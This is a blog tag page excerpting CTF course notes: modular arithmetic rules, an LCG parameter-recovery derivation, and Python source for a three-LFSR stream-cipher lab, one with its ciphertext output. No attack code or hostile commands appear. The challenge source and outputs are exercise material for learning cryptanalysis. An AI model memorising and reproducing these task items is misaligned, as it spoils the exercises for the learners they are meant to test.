<img src=https://imgur.com/d30qIvL.png alt></p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/>Simple Crypto - 0x01(Modular Operation)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/crypto/>Crypto</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-crypto---0x01modular-operation>Simple Crypto - 0x01(Modular Operation)
<a class=anchor href=#simple-crypto---0x01modular-operation>#</a></h1><h6 id=tags-ctf-crypto-eductf>tags: <code>CTF</code> <code>Crypto</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-crypto-eductf>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10225768>『Day 23密碼卷宗現代篇非對稱章 - RSA</a>
<a href=https://blog.csdn.net/lion19930924/article/details/61926019>模运算与逆元</a>
模運算基本特性:
$$
(a + b) % p = (a % p + b % p) % p \
(a - b) % p = (a % p - b % p) % p \
(a * b) % p = (a % p * b % p) % p \
(a ^ b) % p = ((a % p) ^ b ) % p
$$
模運算的结合律：
$$
((a + b) % p + c) % p= (a + (b + c) % p) % p \
((a * b) % p * c) % p = (a * (b * c) % p ) % p
$$
交換律：
$$
(a + b) % p = (b+a) % p \
(a * b) % p = (b * a) % p
$$
分配率：
$$
((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p
$$</p><a href=/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/>Simple Crypto - 0x02(Random Number Generator - LCG)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/crypto/>Crypto</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-crypto---0x02random-number-generator---lcg>Simple Crypto - 0x02(Random Number Generator - LCG)
<a class=anchor href=#simple-crypto---0x02random-number-generator---lcg>#</a></h1><h6 id=tags-ctf-crypto-eductf>tags: <code>CTF</code> <code>Crypto</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-crypto-eductf>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Linear Congruential Generator:
<img src=https://i.imgur.com/pCTWEcO.png alt></p><h2 id=analysis>Analysis
<a class=anchor href=#analysis>#</a></h2><p>LCG Formula
$$
\begin{aligned}
Unknown: S_0&=Seed,\ A,\ B,\ m = 2^{32} \
Given: S_1&,\ S_2,\ S_3\
S_1 &\equiv (AS_0\ +\ B)\ %\ m\
S_2 &\equiv (AS_1\ +\ B)\ %\ m\
S_3 &\equiv (AS_2\ +\ B)\ %\ m\
\end{aligned}
$$</p><p>Derived A
$$
\begin{aligned}
&\left{
\begin{array}{c}
S_2 &\equiv (AS_1\ +\ B)\ %\ m\
S_3 &\equiv (AS_2\ +\ B)\ %\ m
\end{array}
\right.
\ \ \ \ \ \ minus \ two \ formula\ \
&\to (S_2-S_3) \equiv (AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m \
&\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m]\ %\ m \
&\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)-(AS_2\ +\ B)]\ %\ m \
&\to (S_2-S_3)\ % \ m\equiv \ A\ (S_1-S_2)\ \ %\ m =(S_2-S_3)\
A&=((S_2-S_3)(S_1-S_2)^{-1})\ %\ m
\end{aligned}
$$</p><a href=/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/>Simple Crypto - 0x03(2023 Lab - COR)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/crypto/>Crypto</a>,
<a href=/tags/ctf/>CTF</a></div><p><h1 id=simple-crypto---0x032023-lab---cor>Simple Crypto - 0x03(2023 Lab - COR)
<a class=anchor href=#simple-crypto---0x032023-lab---cor>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/rkiE18Kas>Simple Crypto - 0x03(Lab - LFSR)</a></p><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> secret <span style=color:#f92672>import</span> FLAG
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>LFSR</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, tap, state):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_tap <span style=color:#f92672>=</span> tap
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_state <span style=color:#f92672>=</span> state
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getbit</span>(self):
</span></span><span style=display:flex><span>        f <span style=color:#f92672>=</span> sum([self<span style=color:#f92672>.</span>_state[i] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>_tap]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_state[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>_state <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>_state[<span style=color:#ae81ff>1</span>:] <span style=color:#f92672>+</span> [f]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> x
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>triLFSR</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, lfsr1, lfsr2, lfsr3):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>lfsr1 <span style=color:#f92672>=</span> lfsr1
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>lfsr2 <span style=color:#f92672>=</span> lfsr2
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>lfsr3 <span style=color:#f92672>=</span> lfsr3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getbit</span>(self):
</span></span><span style=display:flex><span>        x1 <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>lfsr1<span style=color:#f92672>.</span>getbit()
</span></span><span style=display:flex><span>        x2 <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>lfsr2<span style=color:#f92672>.</span>getbit()
</span></span><span style=display:flex><span>        x3 <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>lfsr3<span style=color:#f92672>.</span>getbit()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> x2 <span style=color:#66d9ef>if</span> x1 <span style=color:#66d9ef>else</span> x3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lfsr1 <span style=color:#f92672>=</span> LFSR([<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>], [random<span style=color:#f92672>.</span>randrange(<span style=color:#ae81ff>2</span>) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>19</span>)])
</span></span><span style=display:flex><span>lfsr2 <span style=color:#f92672>=</span> LFSR([<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>], [random<span style=color:#f92672>.</span>randrange(<span style=color:#ae81ff>2</span>) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>23</span>)])
</span></span><span style=display:flex><span>lfsr3 <span style=color:#f92672>=</span> LFSR([<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>], [random<span style=color:#f92672>.</span>randrange(<span style=color:#ae81ff>2</span>) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>27</span>)])
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> triLFSR(lfsr1, lfsr2, lfsr3)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> map(int, <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{:08b}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> FLAG]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>200</span>):
</span></span><span style=display:flex><span>    output<span style=color:#f92672>.</span>append(cipher<span style=color:#f92672>.</span>getbit())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> flag:
</span></span><span style=display:flex><span>    output<span style=color:#f92672>.</span>append(cipher<span style=color:#f92672>.</span>getbit() <span style=color:#f92672>^</span> b)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(output)
</span></span><span style=display:flex><span><span style=color:#75715e># [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0]</span>
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/>Simple Crypto - 0x03(Lab - LFSR)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/crypto/>Crypto</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-crypto---0x03lab---lfsr>Simple Crypto - 0x03(Lab - LFSR)
<a class=anchor href=#simple-crypto---0x03lab---lfsr>#</a></h1><h6 id=tags-eductf-ctf-crypto>tags: <code>eductf</code> <code>CTF</code> <code>Crypto</code>
<a class=anchor href=#tags-eductf-ctf-crypto>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href="https://youtu.be/hnXtaiyvQ3s?t=945">[2022 fall] 0923 Crypto - LFSR</a>
<a href="https://youtu.be/dYyNeMeDM20?t=4386">Crypto I - LFSR</a></p><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>Must read the source code first with some comment I added
:::spoiler source code</p><pre tabindex=0><code class="language-pytho=" data-lang="pytho=">import random

# from secret import FLAG

FLAG = b&#39;00001111&#39;

class LFSR:
    def __init__(self, tap, state):
        self._tap = tap
        self._state = state

    def getbit(self):
        # f is the new bit that append in last position
        f = sum([self._state[i] for i in self._tap]) &amp; 1

        # x is the output bit
        x = self._state[0]
        
        # self._state is a new state
        self._state = self._state[1:] + [f]
        return x

class triLFSR:
    def __init__(self, lfsr1, lfsr2, lfsr3):
        self.lfsr1 = lfsr1
        self.lfsr2 = lfsr2
        self.lfsr3 = lfsr3

    def getbit(self):
        x1 = self.lfsr1.getbit()
        x2 = self.lfsr2.getbit()
        x3 = self.lfsr3.getbit()
        return x2 if x1 else x3
# These are the state of lfsr1, lfsr2, and lfsr3
A = [random.randrange(2) for _ in range(27)]
B = [random.randrange(2) for _ in range(23)]
C = [random.randrange(2) for _ in range(25)]
print(A, B, C)

# tap is a filter that decide the last bit is 1 or 0
tap1 = [0, 13, 16, 26]
tap2 = [0, 5, 7, 22]
tap3 = [0, 17, 19, 24]

lfsr1 = LFSR(tap1, A)
lfsr2 = LFSR(tap2, B)
lfsr3 = LFSR(tap3, C)
cipher = triLFSR(lfsr1, lfsr2, lfsr3)

# Transfer the flag to ascii code and expressed in binary
# e.g. FLAG = &#39;00001111&#39; → &#39;3030303031313131&#39; → &#39;001100000011000000110000...00110001&#39;(64 bits)
flag = map(int, &#39;&#39;.join([&#34;{:08b}&#34;.format(c) for c in FLAG]))

output = []

for b in flag:
    # print(b)
    output.append(cipher.getbit() ^ b)

for _ in range(200):
    output.append(cipher.getbit())

# print(output)
</code></pre><p>:::</p><a href=/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/>...</a></p></article><ul class="pagination pagination-default"><li class="page-item disabled"><a aria-disabled=true aria-label=First class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;&#171;</span></a></li><li class="page-item disabled"><a aria-disabled=true aria-label=Previous class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;</span></a></li><li class="page-item active"><a aria-current=page aria-label="Page 1" class=page-link role=button>1</a></li><li class=page-item><a href=/tags/eductf/page/2/ aria-label="Page 2" class=page-link role=button>2</a></li><li class=page-item><a href=/tags/eductf/page/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/eductf/page/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class=page-item><a href=/tags/eductf/page/5/ aria-label="Page 5" class=page-link role=button>5</a></li><li class=page-item><a href=/tags/eductf/page/2/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/eductf/page/9/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>